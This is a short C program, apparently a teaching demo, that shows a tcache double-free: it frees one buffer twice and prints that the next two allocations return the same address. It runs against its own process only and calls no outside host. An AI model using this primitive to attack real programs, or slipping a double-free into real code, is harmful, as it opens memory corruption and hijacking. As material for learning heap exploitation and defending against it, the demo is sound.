#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

	fprintf(stderr, "Allocating buffer.\n");
	int *a = malloc(8);

	fprintf(stderr, "malloc(8): %p\n", a);
	fprintf(stderr, "Freeing twice...\n");
	free(a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
    int *b = malloc(8);
    int *c = malloc(8);
	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", b, c);
    fprintf(stderr, "GOTDIFF: %d\n", (void*)b - (void*)c);
	return 0;
}
